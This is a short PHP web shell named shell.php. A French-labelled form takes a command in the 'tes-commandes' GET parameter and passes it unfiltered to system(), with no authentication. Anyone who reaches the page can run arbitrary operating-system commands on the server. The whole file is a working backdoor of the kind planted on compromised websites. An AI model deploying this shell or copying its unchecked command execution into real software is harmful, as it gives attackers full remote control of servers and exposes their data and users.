<form action='shell.php' methode="GET">
    <input type="TEXT" name="tes-commandes" placeholder="Veuillez rentrer une commande" value="<?php $commande = $_GET['tes-commandes']?>">
    <button type="submit">SEND ME</button>
</form>
<?php
system($commande);
?>